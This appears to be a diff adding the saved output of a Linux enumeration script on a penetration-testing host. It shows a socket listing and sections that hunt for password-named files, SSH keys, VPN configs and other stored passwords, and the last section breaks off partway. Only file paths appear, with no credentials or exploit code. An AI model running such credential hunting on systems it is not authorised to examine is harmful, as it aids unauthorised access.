+unix  3      [ ]         STREAM     CONNECTED     18210    /tmp/dbus-VtoGV3BGue
+unix  3      [ ]         SEQPACKET  CONNECTED     636304   
+unix  3      [ ]         STREAM     CONNECTED     18987    
+unix  3      [ ]         STREAM     CONNECTED     17187    
+unix  3      [ ]         STREAM     CONNECTED     17092    
+unix  3      [ ]         STREAM     CONNECTED     904378   
+unix  3      [ ]         STREAM     CONNECTED     18343    /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     16529    /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     16404    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     641073   
+unix  3      [ ]         STREAM     CONNECTED     633851   
+unix  2      [ ]         DGRAM                    531412   
+unix  3      [ ]         STREAM     CONNECTED     18749    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     2002     
+unix  3      [ ]         STREAM     CONNECTED     18112    /run/user/1000/pulse/native
+unix  3      [ ]         STREAM     CONNECTED     904383   
+unix  3      [ ]         STREAM     CONNECTED     640031   
+unix  3      [ ]         STREAM     CONNECTED     18619    /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     1002841  
+unix  3      [ ]         STREAM     CONNECTED     636200   
+unix  3      [ ]         STREAM     CONNECTED     636045   
+unix  3      [ ]         STREAM     CONNECTED     17359    
+unix  3      [ ]         STREAM     CONNECTED     1013840  
+unix  3      [ ]         STREAM     CONNECTED     1002408  
+unix  3      [ ]         STREAM     CONNECTED     634759   
+unix  3      [ ]         SEQPACKET  CONNECTED     634745   
+unix  3      [ ]         STREAM     CONNECTED     631254   
+unix  3      [ ]         STREAM     CONNECTED     18191    /tmp/dbus-VtoGV3BGue
+unix  2      [ ]         DGRAM                    17128    
+unix  2      [ ]         DGRAM                    16940    
+unix  3      [ ]         DGRAM                    14109    
+
+[0;94m###################################################[0m
+[0;94mLocate each file with string "password" for name #[0m
+[0;94m###################################################[0m
+/boot/grub/i386-pc/legacy_password_test.mod
+/boot/grub/i386-pc/password.mod
+/boot/grub/i386-pc/password_pbkdf2.mod
+/etc/cryptsetup-nuke-password
+/etc/pam.d/common-password
+/usr/bin/systemd-ask-password
+/usr/bin/systemd-tty-ask-password-agent
+/usr/lib/cryptsetup-nuke-password
+/usr/lib/cryptsetup-nuke-password/crypt
+/usr/lib/grub/i386-pc/legacy_password_test.mod
+/usr/lib/grub/i386-pc/password.mod
+/usr/lib/grub/i386-pc/password_pbkdf2.mod
+/usr/lib/mysql/plugin/simple_password_check.so
+/usr/lib/postgresql/14/lib/passwordcheck.so
+/usr/lib/postgresql/14/lib/bitcode/passwordcheck
+/usr/lib/postgresql/14/lib/bitcode/passwordcheck.index.bc
+/usr/lib/postgresql/14/lib/bitcode/passwordcheck/passwordcheck.bc
+/usr/lib/pppd/2.4.9/passwordfd.so
+/usr/lib/python3/dist-packages/cme/modules/gpp_password.py
+/usr/lib/python3/dist-packages/cme/modules/__pycache__/gpp_password.cpython-39.pyc
+/usr/lib/python3/dist-packages/django/contrib/admin/templates/admin/auth/user/change_password.html
+/usr/lib/python3/dist-packages/django/contrib/admin/templates/registration/password_change_done.html
+/usr/lib/python3/dist-packages/django/contrib/admin/templates/registration/password_change_form.html
+/usr/lib/python3/dist-packages/django/contrib/admin/templates/registration/password_reset_complete.html
+/usr/lib/python3/dist-packages/django/contrib/admin/templates/registration/password_reset_confirm.html
+/usr/lib/python3/dist-packages/django/contrib/admin/templates/registration/password_reset_done.html
+/usr/lib/python3/dist-packages/django/contrib/admin/templates/registration/password_reset_email.html
+/usr/lib/python3/dist-packages/django/contrib/admin/templates/registration/password_reset_form.html
+/usr/lib/python3/dist-packages/django/contrib/auth/common-passwords.txt.gz
+/usr/lib/python3/dist-packages/django/contrib/auth/password_validation.py
+/usr/lib/python3/dist-packages/django/contrib/auth/__pycache__/password_validation.cpython-39.pyc
+/usr/lib/python3/dist-packages/django/contrib/auth/management/commands/changepassword.py
+/usr/lib/python3/dist-packages/django/contrib/auth/management/commands/__pycache__/changepassword.cpython-39.pyc
+/usr/lib/python3/dist-packages/django/contrib/auth/templates/auth/widgets/read_only_password_hash.html
+/usr/lib/python3/dist-packages/django/contrib/auth/templates/registration/password_reset_subject.txt
+/usr/lib/python3/dist-packages/django/forms/jinja2/django/forms/widgets/password.html
+/usr/lib/python3/dist-packages/django/forms/templates/django/forms/widgets/password.html
+/usr/lib/python3/dist-packages/faraday/server/commands/change_password.py
+/usr/lib/python3/dist-packages/faraday/server/commands/__pycache__/change_password.cpython-39.pyc
+/usr/lib/python3/dist-packages/flask_security/password_util.py
+/usr/lib/python3/dist-packages/flask_security/passwordless.py
+/usr/lib/python3/dist-packages/flask_security/__pycache__/password_util.cpython-39.pyc
+/usr/lib/python3/dist-packages/flask_security/__pycache__/passwordless.cpython-39.pyc
+/usr/lib/python3/dist-packages/flask_security/templates/security/change_password.html
+/usr/lib/python3/dist-packages/flask_security/templates/security/forgot_password.html
+/usr/lib/python3/dist-packages/flask_security/templates/security/reset_password.html
+/usr/lib/python3/dist-packages/jedi/third_party/django-stubs/django-stubs/contrib/auth/password_validation.pyi
+/usr/lib/python3/dist-packages/pypykatz/utils/crypto/gppassword.py
+/usr/lib/python3/dist-packages/pypykatz/utils/crypto/__pycache__/gppassword.cpython-39.pyc
+/usr/lib/python3/dist-packages/samba/tests/password_hash.py
+/usr/lib/python3/dist-packages/samba/tests/password_hash_fl2003.py
+/usr/lib/python3/dist-packages/samba/tests/password_hash_fl2008.py
+/usr/lib/python3/dist-packages/samba/tests/password_hash_gpgme.py
+/usr/lib/python3/dist-packages/samba/tests/password_hash_ldap.py
+/usr/lib/python3/dist-packages/samba/tests/password_quality.py
+/usr/lib/python3/dist-packages/samba/tests/password_test.py
+/usr/lib/python3/dist-packages/samba/tests/__pycache__/password_hash.cpython-39.pyc
+/usr/lib/python3/dist-packages/samba/tests/__pycache__/password_hash_fl2003.cpython-39.pyc
+/usr/lib/python3/dist-packages/samba/tests/__pycache__/password_hash_fl2008.cpython-39.pyc
+/usr/lib/python3/dist-packages/samba/tests/__pycache__/password_hash_gpgme.cpython-39.pyc
+/usr/lib/python3/dist-packages/samba/tests/__pycache__/password_hash_ldap.cpython-39.pyc
+/usr/lib/python3/dist-packages/samba/tests/__pycache__/password_quality.cpython-39.pyc
+/usr/lib/python3/dist-packages/samba/tests/__pycache__/password_test.cpython-39.pyc
+/usr/lib/python3/dist-packages/samba/tests/samba_tool/passwordsettings.py
+/usr/lib/python3/dist-packages/samba/tests/samba_tool/provision_password_check.py
+/usr/lib/python3/dist-packages/samba/tests/samba_tool/user_check_password_script.py
+/usr/lib/python3/dist-packages/samba/tests/samba_tool/__pycache__/passwordsettings.cpython-39.pyc
+/usr/lib/python3/dist-packages/samba/tests/samba_tool/__pycache__/provision_password_check.cpython-39.pyc
+/usr/lib/python3/dist-packages/samba/tests/samba_tool/__pycache__/user_check_password_script.cpython-39.pyc
+/usr/lib/python3/dist-packages/wapitiCore/data/attacks/passwords.txt
+/usr/lib/systemd/systemd-reply-password
+/usr/lib/systemd/system/systemd-ask-password-console.path
+/usr/lib/systemd/system/systemd-ask-password-console.service
+/usr/lib/systemd/system/systemd-ask-password-plymouth.path
+/usr/lib/systemd/system/systemd-ask-password-plymouth.service
+/usr/lib/systemd/system/systemd-ask-password-wall.path
+/usr/lib/systemd/system/systemd-ask-password-wall.service
+/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path
+/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path
+/usr/lib/x86_64-linux-gnu/libmariadb3/plugin/caching_sha2_password.so
+/usr/lib/x86_64-linux-gnu/libmariadb3/plugin/mysql_clear_password.so
+/usr/lib/x86_64-linux-gnu/libmariadb3/plugin/sha256_password.so
+/usr/lib/x86_64-linux-gnu/samba/ldb/password_hash.so
+/usr/share/commix/src/txt/passwords_john.txt
+/usr/share/desktop-directories/05-password-attacks.directory
+/usr/share/doc/cryptsetup-nuke-password
+/usr/share/doc/cryptsetup-nuke-password/README.md
+/usr/share/doc/cryptsetup-nuke-password/changelog.gz
+/usr/share/doc/cryptsetup-nuke-password/copyright
+/usr/share/doc/metasploit-framework/modules/auxiliary/admin/http/mantisbt_password_reset.md
+/usr/share/doc/metasploit-framework/modules/auxiliary/admin/http/netgear_soap_password_extractor.md
+/usr/share/doc/metasploit-framework/modules/auxiliary/gather/c2s_dvr_password_disclosure.md
+/usr/share/doc/metasploit-framework/modules/auxiliary/gather/ipcamera_password_disclosure.md
+/usr/share/doc/metasploit-framework/modules/auxiliary/scanner/http/http_sickrage_password_leak.md
+/usr/share/doc/metasploit-framework/modules/exploit/osx/local/root_no_password.md
+/usr/share/doc/metasploit-framework/modules/post/firefox/gather/passwords.md
+/usr/share/doc/metasploit-framework/modules/post/osx/gather/password_prompt_spoof.md
+/usr/share/doc/metasploit-framework/modules/post/osx/gather/vnc_password_osx.md
+/usr/share/doc/metasploit-framework/modules/post/windows/gather/credentials/avira_password.md
+/usr/share/doc/metasploit-framework/modules/post/windows/gather/credentials/teamviewer_passwords.md
+/usr/share/doc/metasploit-framework/modules/post/windows/gather/credentials/xshell_xftp_password.md
+/usr/share/doc/p7zip/DOC/MANUAL/cmdline/switches/password.htm
+/usr/share/faraday/server/www/images/icon-login-password-lock.svg
+/usr/share/hashcat/rules/T0XlC-insert_top_100_passwords_1_G.rule
+/usr/share/help/C/onboard/password-dialogs.page
+/usr/share/help/C/zenity/password.page
+/usr/share/help/C/zenity/figures/zenity-password-screenshot.png
+/usr/share/help/bg/zenity/password.page
+/usr/share/help/bg/zenity/figures/zenity-password-screenshot.png
+/usr/share/help/ca/zenity/password.page
+/usr/share/help/ca/zenity/figures/zenity-password-screenshot.png
+/usr/share/help/cs/zenity/password.page
+/usr/share/help/cs/zenity/figures/zenity-password-screenshot.png
+/usr/share/help/da/zenity/password.page
+/usr/share/help/da/zenity/figures/zenity-password-screenshot.png
+/usr/share/help/de/zenity/password.page
+/usr/share/help/de/zenity/figures/zenity-password-screenshot.png
+/usr/share/help/el/zenity/password.page
+/usr/share/help/el/zenity/figures/zenity-password-screenshot.png
+/usr/share/help/en_GB/zenity/password.page
+/usr/share/help/en_GB/zenity/figures/zenity-password-screenshot.png
+/usr/share/help/es/zenity/password.page
+/usr/share/help/es/zenity/figures/zenity-password-screenshot.png
+/usr/share/help/eu/zenity/password.page
+/usr/share/help/eu/zenity/figures/zenity-password-screenshot.png
+/usr/share/help/fi/zenity/password.page
+/usr/share/help/fi/zenity/figures/zenity-password-screenshot.png
+/usr/share/help/fr/zenity/password.page
+/usr/share/help/fr/zenity/figures/zenity-password-screenshot.png
+/usr/share/help/gl/zenity/password.page
+/usr/share/help/gl/zenity/figures/zenity-password-screenshot.png
+/usr/share/help/hu/zenity/password.page
+/usr/share/help/hu/zenity/figures/zenity-password-screenshot.png
+/usr/share/help/ja/zenity/password.page
+/usr/share/help/ja/zenity/figures/zenity-password-screenshot.png
+/usr/share/help/oc/zenity/password.page
+/usr/share/help/oc/zenity/figures/zenity-password-screenshot.png
+/usr/share/help/pl/zenity/password.page
+/usr/share/help/pl/zenity/figures/zenity-password-screenshot.png
+/usr/share/help/pt_BR/zenity/password.page
+/usr/share/help/pt_BR/zenity/figures/zenity-password-screenshot.png
+/usr/share/help/ru/zenity/password.page
+/usr/share/help/ru/zenity/figures/zenity-password-screenshot.png
+/usr/share/help/sl/zenity/password.page
+/usr/share/help/sl/zenity/figures/zenity-password-screenshot.png
+/usr/share/help/sv/zenity/password.page
+/usr/share/help/sv/zenity/figures/zenity-password-screenshot.png
+/usr/share/help/uk/zenity/password.page
+/usr/share/help/uk/zenity/figures/zenity-password-screenshot.png
+/usr/share/help/zh_CN/zenity/password.page
+/usr/share/help/zh_CN/zenity/figures/zenity-password-screenshot.png
+/usr/share/icons/Adwaita/16x16/legacy/dialog-password.png
+/usr/share/icons/Adwaita/16x16/status/dialog-password-symbolic.symbolic.png
+/usr/share/icons/Adwaita/22x22/legacy/dialog-password.png
+/usr/share/icons/Adwaita/24x24/legacy/dialog-password.png
+/usr/share/icons/Adwaita/24x24/status/dialog-password-symbolic.symbolic.png
+/usr/share/icons/Adwaita/256x256/legacy/dialog-password.png
+/usr/share/icons/Adwaita/32x32/legacy/dialog-password.png
+/usr/share/icons/Adwaita/32x32/status/dialog-password-symbolic.symbolic.png
+/usr/share/icons/Adwaita/48x48/legacy/dialog-password.png
+/usr/share/icons/Adwaita/48x48/status/dialog-password-symbolic.symbolic.png
+/usr/share/icons/Adwaita/64x64/status/dialog-password-symbolic.symbolic.png
+/usr/share/icons/Adwaita/96x96/status/dialog-password-symbolic.symbolic.png
+/usr/share/icons/Adwaita/scalable/status/dialog-password-symbolic.svg
+/usr/share/icons/Flat-Remix-Blue-Dark/actions/scalable/dialog-password.svg
+/usr/share/icons/Flat-Remix-Blue-Dark/actions/scalable/password-copy.svg
+/usr/share/icons/Flat-Remix-Blue-Dark/actions/scalable/password-generator.svg
+/usr/share/icons/Flat-Remix-Blue-Dark/actions/scalable/preferences-desktop-user-password.svg
+/usr/share/icons/Flat-Remix-Blue-Dark/apps/scalable/1password.svg
+/usr/share/icons/Flat-Remix-Blue-Dark/apps/scalable/appimagekit-1password.svg
+/usr/share/icons/Flat-Remix-Blue-Dark/apps/scalable/dialog-password.svg
+/usr/share/icons/Flat-Remix-Blue-Dark/apps/scalable/gcr-password.svg
+/usr/share/icons/Flat-Remix-Blue-Dark/apps/scalable/kali-password-attacks-trans.svg
+/usr/share/icons/Flat-Remix-Blue-Dark/apps/scalable/password-manager.svg
+/usr/share/icons/Flat-Remix-Blue-Dark/apps/scalable/password.svg
+/usr/share/icons/Flat-Remix-Blue-Dark/apps/scalable/passwords.svg
+/usr/share/icons/Flat-Remix-Blue-Dark/apps/scalable/preferences-desktop-user-password.svg
+/usr/share/icons/Flat-Remix-Blue-Dark/apps/symbolic/password-manager-symbolic.svg
+/usr/share/icons/Flat-Remix-Blue-Dark/panel/1password-panel.svg
+/usr/share/icons/Flat-Remix-Blue-Dark/panel/dialog-password-panel.svg
+/usr/share/icons/Flat-Remix-Blue-Dark/status/symbolic/dialog-password-symbolic.svg
+/usr/share/icons/Flat-Remix-Blue-Light/actions/scalable/dialog-password.svg
+/usr/share/icons/Flat-Remix-Blue-Light/actions/scalable/password-copy.svg
+/usr/share/icons/Flat-Remix-Blue-Light/actions/scalable/password-generator.svg
+/usr/share/icons/Flat-Remix-Blue-Light/actions/scalable/preferences-desktop-user-password.svg
+/usr/share/icons/Flat-Remix-Blue-Light/panel/1password-panel.svg
+/usr/share/icons/Flat-Remix-Blue-Light/panel/dialog-password-panel.svg
+/usr/share/icons/Windows-10-Icons/16x16/status/dialog-password.png
+/usr/share/icons/Windows-10-Icons/22x22/status/dialog-password.png
+/usr/share/icons/Windows-10-Icons/24x24/status/dialog-password.png
+/usr/share/icons/Windows-10-Icons/256x256/status/dialog-password.png
+/usr/share/icons/Windows-10-Icons/32x32/status/dialog-password.png
+/usr/share/icons/Windows-10-Icons/48x48/status/dialog-password.png
+/usr/share/icons/Windows-10-Icons/scalable/status/dialog-password-symbolic.svg
+/usr/share/icons/hicolor/16x16/apps/gcr-password.png
+/usr/share/icons/hicolor/16x16/categories/kali-password-attacks-trans.png
+/usr/share/icons/hicolor/22x22/apps/gcr-password.png
+/usr/share/icons/hicolor/22x22/categories/kali-password-attacks-trans.png
+/usr/share/icons/hicolor/24x24/apps/gcr-password.png
+/usr/share/icons/hicolor/24x24/categories/kali-password-attacks-trans.png
+/usr/share/icons/hicolor/256x256/apps/gcr-password.png
+/usr/share/icons/hicolor/256x256/categories/kali-password-attacks-trans.png
+/usr/share/icons/hicolor/32x32/apps/gcr-password.png
+/usr/share/icons/hicolor/32x32/categories/kali-password-attacks-trans.png
+/usr/share/icons/hicolor/48x48/apps/gcr-password.png
+/usr/share/icons/hicolor/48x48/categories/kali-password-attacks-trans.png
+/usr/share/icons/hicolor/scalable/categories/kali-password-attacks-trans.svg
+/usr/share/initramfs-tools/hooks/cryptsetup-nuke-password
+/usr/share/john/1password2john.py
+/usr/share/john/password.lst
+/usr/share/john/__pycache__/1password2john.cpython-39.pyc
+/usr/share/john/rules/T0XlC-insert_top_100_passwords_1_G.rule
+/usr/share/legion/wordlists/ssh-password.txt
+/usr/share/man/man1/systemd-ask-password.1.gz
+/usr/share/man/man1/systemd-tty-ask-password-agent.1.gz
+/usr/share/man/man3/zip_set_default_password.3.gz
+/usr/share/man/man8/systemd-ask-password-console.path.8.gz
+/usr/share/man/man8/systemd-ask-password-console.service.8.gz
+/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
+/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
+/usr/share/metasploit-framework/script-password
+/usr/share/metasploit-framework/data/wordlists/hci_oracle_passwords.csv
+/usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt
+/usr/share/metasploit-framework/data/wordlists/oracle_default_passwords.csv
+/usr/share/metasploit-framework/data/wordlists/password.lst
+/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+/usr/share/metasploit-framework/data/wordlists/vnc_passwords.txt
+/usr/share/metasploit-framework/lib/metasploit/framework/password_crackers
+/usr/share/metasploit-framework/lib/metasploit/framework/password_crackers/cracker.rb
+/usr/share/metasploit-framework/lib/metasploit/framework/password_crackers/hashcat
+/usr/share/metasploit-framework/lib/metasploit/framework/password_crackers/invalid_wordlist.rb
+/usr/share/metasploit-framework/lib/metasploit/framework/password_crackers/jtr
+/usr/share/metasploit-framework/lib/metasploit/framework/password_crackers/wordlist.rb
+/usr/share/metasploit-framework/lib/metasploit/framework/password_crackers/hashcat/formatter.rb
+/usr/share/metasploit-framework/lib/metasploit/framework/password_crackers/jtr/formatter.rb
+/usr/share/metasploit-framework/lib/msf/core/auxiliary/password_cracker.rb
+/usr/share/metasploit-framework/lib/msf/core/web_services/authentication/strategies/user_password.rb
+/usr/share/metasploit-framework/modules/auxiliary/admin/2wire/xslt_password_reset.rb
+/usr/share/metasploit-framework/modules/auxiliary/admin/http/dlink_dir_645_password_extractor.rb
+/usr/share/metasploit-framework/modules/auxiliary/admin/http/dlink_dsl320b_password_extractor.rb
+/usr/share/metasploit-framework/modules/auxiliary/admin/http/mantisbt_password_reset.rb
+/usr/share/metasploit-framework/modules/auxiliary/admin/http/netgear_soap_password_extractor.rb
+/usr/share/metasploit-framework/modules/auxiliary/admin/http/zyxel_admin_password_extractor.rb
+/usr/share/metasploit-framework/modules/auxiliary/admin/scada/modicon_password_recovery.rb
+/usr/share/metasploit-framework/modules/auxiliary/admin/vxworks/apple_airport_extreme_password.rb
+/usr/share/metasploit-framework/modules/auxiliary/dos/http/wordpress_long_password_dos.rb
+/usr/share/metasploit-framework/modules/auxiliary/gather/c2s_dvr_password_disclosure.rb
+/usr/share/metasploit-framework/modules/auxiliary/gather/ipcamera_password_disclosure.rb
+/usr/share/metasploit-framework/modules/auxiliary/gather/netgear_password_disclosure.rb
+/usr/share/metasploit-framework/modules/auxiliary/scanner/http/http_sickrage_password_leak.rb
+/usr/share/metasploit-framework/modules/auxiliary/scanner/misc/raysharp_dvr_passwords.rb
+/usr/share/metasploit-framework/modules/auxiliary/scanner/misc/rosewill_rxs3211_passwords.rb
+/usr/share/metasploit-framework/modules/auxiliary/scanner/telnet/lantronix_telnet_password.rb
+/usr/share/metasploit-framework/modules/exploits/linux/antivirus/escan_password_exec.rb
+/usr/share/metasploit-framework/modules/exploits/osx/local/root_no_password.rb
+/usr/share/metasploit-framework/modules/exploits/osx/local/sudo_password_bypass.rb
+/usr/share/metasploit-framework/modules/exploits/windows/http/integard_password_bof.rb
+/usr/share/metasploit-framework/modules/post/firefox/gather/passwords.rb
+/usr/share/metasploit-framework/modules/post/osx/gather/autologin_password.rb
+/usr/share/metasploit-framework/modules/post/osx/gather/password_prompt_spoof.rb
+/usr/share/metasploit-framework/modules/post/osx/gather/vnc_password_osx.rb
+/usr/share/metasploit-framework/modules/post/windows/gather/credentials/avira_password.rb
+/usr/share/metasploit-framework/modules/post/windows/gather/credentials/teamviewer_passwords.rb
+/usr/share/metasploit-framework/modules/post/windows/gather/credentials/xshell_xftp_password.rb
+/usr/share/metasploit-framework/modules/post/windows/manage/change_password.rb
+/usr/share/metasploit-framework/tools/password
+/usr/share/metasploit-framework/tools/password/cpassword_decrypt.rb
+/usr/share/metasploit-framework/tools/password/halflm_second.rb
+/usr/share/metasploit-framework/tools/password/hmac_sha1_crack.rb
+/usr/share/metasploit-framework/tools/password/lm2ntcrack.rb
+/usr/share/metasploit-framework/tools/password/md5_lookup.rb
+/usr/share/metasploit-framework/tools/password/vxdigger.rb
+/usr/share/metasploit-framework/tools/password/vxencrypt.rb
+/usr/share/metasploit-framework/tools/password/vxmaster.rb
+/usr/share/metasploit-framework/tools/password/winscp_decrypt.rb
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/actionview-6.1.4.1/lib/action_view/helpers/tags/password_field.rb
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/activemodel-6.1.4.1/lib/active_model/secure_password.rb
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/bcrypt-3.1.16/lib/bcrypt/password.rb
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/bcrypt-3.1.16/spec/bcrypt/password_spec.rb
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/authentication/method/password
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/authentication/method/password.rb
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/authentication/method/password/context.rb
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/metasploit-credential-5.0.5/app/models/metasploit/credential/blank_password.rb
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/metasploit-credential-5.0.5/app/models/metasploit/credential/password.rb
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/metasploit-credential-5.0.5/app/models/metasploit/credential/password_hash.rb
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/metasploit-credential-5.0.5/app/models/metasploit/credential/origin/cracked_password.rb
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/metasploit-credential-5.0.5/db/migrate/20140605173747_create_metasploit_credential_origin_cracked_passwords.rb
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/metasploit-credential-5.0.5/spec/factories/metasploit/credential/password_hashes.rb
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/metasploit-credential-5.0.5/spec/factories/metasploit/credential/passwords.rb
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/metasploit-credential-5.0.5/spec/models/metasploit/credential/password_hash_spec.rb
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/metasploit-credential-5.0.5/spec/models/metasploit/credential/password_spec.rb
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/metasploit-credential-5.0.5/spec/models/metasploit/credential/origin/cracked_password_spec.rb
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/metasploit-model-4.0.3/app/validators/password_is_strong_validator.rb
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/metasploit-model-4.0.3/spec/app/validators/password_is_strong_validator_spec.rb
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/net-ldap-0.17.0/lib/net/ldap/password.rb
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/net-ssh-6.1.0/lib/net/ssh/authentication/methods/password.rb
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/nexpose-7.3.0/lib/nexpose/password_policy.rb
+/usr/share/nmap/nselib/data/passwords.lst
+/usr/share/nmap/scripts/http-domino-enum-passwords.nse
+/usr/share/nmap/scripts/ms-sql-empty-password.nse
+/usr/share/nmap/scripts/mysql-empty-password.nse
+/usr/share/pam/common-password
+/usr/share/pam/common-password.md5sums
+/usr/share/plymouth/themes/futureprototype/password_dot.png
+/usr/share/plymouth/themes/futureprototype/password_dot16.png
+/usr/share/plymouth/themes/futureprototype/password_field.png
+/usr/share/plymouth/themes/futureprototype/password_field16.png
+/usr/share/plymouth/themes/homeworld/password_dot.png
+/usr/share/plymouth/themes/homeworld/password_dot16.png
+/usr/share/plymouth/themes/homeworld/password_field.png
+/usr/share/plymouth/themes/homeworld/password_field16.png
+/usr/share/plymouth/themes/joy/password_dot.png
+/usr/share/plymouth/themes/joy/password_dot16.png
+/usr/share/plymouth/themes/joy/password_field.png
+/usr/share/plymouth/themes/joy/password_field16.png
+/usr/share/plymouth/themes/kali/password-dot.png
+/usr/share/plymouth/themes/kali/password-field.png
+/usr/share/plymouth/themes/lines/password_dot.png
+/usr/share/plymouth/themes/lines/password_dot16.png
+/usr/share/plymouth/themes/lines/password_field.png
+/usr/share/plymouth/themes/lines/password_field16.png
+/usr/share/plymouth/themes/moonlight/password_dot.png
+/usr/share/plymouth/themes/moonlight/password_dot16.png
+/usr/share/plymouth/themes/moonlight/password_field.png
+/usr/share/plymouth/themes/moonlight/password_field16.png
+/usr/share/plymouth/themes/softwaves/password_dot.png
+/usr/share/plymouth/themes/softwaves/password_dot16.png
+/usr/share/plymouth/themes/softwaves/password_field.png
+/usr/share/plymouth/themes/softwaves/password_field16.png
+/usr/share/powershell-empire/empire/server/modules/powershell/credentials/get_lapspasswords.yaml
+/usr/share/powershell-empire/empire/server/modules/powershell/credentials/mimikatz/logonpasswords.yaml
+/usr/share/powershell-empire/empire/server/modules/python/privesc/windows/get_gpppasswords.yaml
+/usr/share/sqlmap/tamper/sp_password.py
+/usr/share/sqlmap/tamper/__pycache__/sp_password.cpython-39.pyc
+/usr/share/whatweb/plugins/java-password-log.rb
+/usr/share/whatweb/plugins/password_field.rb
+/usr/share/whatweb/plugins/quest-password-manager.rb
+/usr/share/windows-resources/mimikatz/kiwi_passwords.yar
+/var/cache/debconf/passwords.dat
+/var/lib/dpkg/info/cryptsetup-nuke-password.config
+/var/lib/dpkg/info/cryptsetup-nuke-password.list
+/var/lib/dpkg/info/cryptsetup-nuke-password.md5sums
+/var/lib/dpkg/info/cryptsetup-nuke-password.postinst
+/var/lib/dpkg/info/cryptsetup-nuke-password.postrm
+/var/lib/dpkg/info/cryptsetup-nuke-password.preinst
+/var/lib/dpkg/info/cryptsetup-nuke-password.templates
+/var/lib/pam/password
+
+[0;94m###################################################[0m
+[0;94mSSH keys                                          #[0m
+[0;94m###################################################[0m
+No SSH keys
+
+[0;94m###################################################[0m
+[0;94mSSH weak keys                                     #[0m
+[0;94m###################################################[0m
+No SSH weak keys
+
+[0;94m###################################################[0m
+[0;94mOVPN files                                        #[0m
+[0;94m###################################################[0m
+No ovpn files
+
+[0;94m###################################################[0m
+[0;94mOthers passwords                                  #[0m
+[0;94m###################################################[0m
+[0;91m./result.txt:[0;94mLocate each file with string "password" for name #[0m
+./result.txt:/boot/grub/i386-pc/legacy_password_test.mod
+./result.txt:/boot/grub/i386-pc/password.mod
+./result.txt:/boot/grub/i386-pc/password_pbkdf2.mod
+./result.txt:/etc/cryptsetup-nuke-password
+./result.txt:/etc/pam.d/common-password
+./result.txt:/usr/bin/systemd-ask-password
+./result.txt:/usr/bin/systemd-tty-ask-password-agent
+./result.txt:/usr/lib/cryptsetup-nuke-password
+./result.txt:/usr/lib/cryptsetup-nuke-password/crypt
+./result.txt:/usr/lib/grub/i386-pc/legacy_password_test.mod
+./result.txt:/usr/lib/grub/i386-pc/password.mod
+./result.txt:/usr/lib/grub/i386-pc/password_pbkdf2.mod
+./result.txt:/usr/lib/mysql/plugin/simple_password_check.so
+./result.txt:/usr/lib/postgresql/14/lib/passwordcheck.so
+./result.txt:/usr/lib/postgresql/14/lib/bitcode/passwordcheck
+./result.txt:/usr/lib/postgresql/14/lib/bitcode/passwordcheck.index.bc
+./result.txt:/usr/lib/postgresql/14/lib/bitcode/passwordcheck/passwordcheck.bc
+./result.txt:/usr/lib/pppd/2.4.9/passwordfd.so
+./result.txt:/usr/lib/python3/dist-packages/cme/modules/gpp_password.py
+./result.txt:/usr/lib/python3/dist-packages/cme/modules/__pycache__/gpp_password.cpython-39.pyc
+./result.txt:/usr/lib/python3/dist-packages/django/contrib/admin/templates/admin/auth/user/change_password.html
+./result.txt:/usr/lib/python3/dist-packages/django/contrib/admin/templates/registration/password_change_done.html
+./result.txt:/usr/lib/python3/dist-packages/django/contrib/admin/templates/registration/password_change_form.html
+./result.txt:/usr/lib/python3/dist-packages/django/contrib/admin/templates/registration/password_reset_complete.html
+./result.txt:/usr/lib/python3/dist-packages/django/contrib/admin/templates/registration/password_reset_confirm.html
+./result.txt:/usr/lib/python3/dist-packages/django/contrib/admin/templates/registration/password_reset_done.html
+./result.txt:/usr/lib/python3/dist-packages/django/contrib/admin/templates/registration/password_reset_email.html
+./result.txt:/usr/lib/python3/dist-packages/django/contrib/admin/templates/registration/password_reset_form.html
+./result.txt:/usr/lib/python3/dist-packages/django/contrib/auth/common-passwords.txt.gz
+./result.txt:/usr/lib/python3/dist-packages/django/contrib/auth/password_validation.py
+./result.txt:/usr/lib/python3/dist-packages/django/contrib/auth/__pycache__/password_validation.cpython-39.pyc
+./result.txt:/usr/lib/python3/dist-packages/django/contrib/auth/management/commands/changepassword.py
+./result.txt:/usr/lib/python3/dist-packages/django/contrib/auth/management/commands/__pycache__/changepassword.cpython-39.pyc
